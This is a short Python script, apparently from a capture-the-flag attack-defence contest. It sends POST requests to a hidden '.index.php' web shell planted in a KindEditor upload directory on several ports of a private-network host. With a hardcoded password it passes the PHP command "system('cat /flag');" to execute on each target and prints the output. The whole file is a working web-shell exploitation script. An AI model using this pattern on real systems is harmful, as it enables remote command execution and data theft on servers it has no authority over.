import requests

url_start = 'http://192.168.15.80:'
url_end = '/sqlgunadmin/kindedit/attached/20220715/.index.php'
flag_data = {'pass':'q398612964','a': "system('cat /flag');"}
for i in range(8801,8806):
    url = url_start +str(i) + url_end
    ret = requests.post(url, data=flag_data, timeout=2)
    print(ret.text)

